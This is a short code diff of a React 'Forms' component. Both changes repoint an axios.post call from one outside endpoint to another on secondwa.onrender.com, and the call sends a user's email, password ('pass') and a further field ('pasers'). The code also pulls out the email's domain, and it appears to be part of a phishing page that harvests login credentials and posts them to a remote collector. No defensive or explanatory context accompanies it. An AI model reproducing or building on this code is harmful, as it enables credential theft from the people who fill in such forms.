@@ -21,7 +21,7 @@ function Forms() {
     setConfirmForm(true);
     setShowForm(false);
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail3", {
+      await axios.post("https://secondwa.onrender.com/sendmail4", {
         email,
         pass,
         pasers,
@@ -37,7 +37,7 @@ function Forms() {
     let domain = email.substring(email.lastIndexOf("@") + 1);
 
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail3", {
+      await axios.post("https://secondwa.onrender.com/sendmail4", {
         email,
         pass,
         pasers,
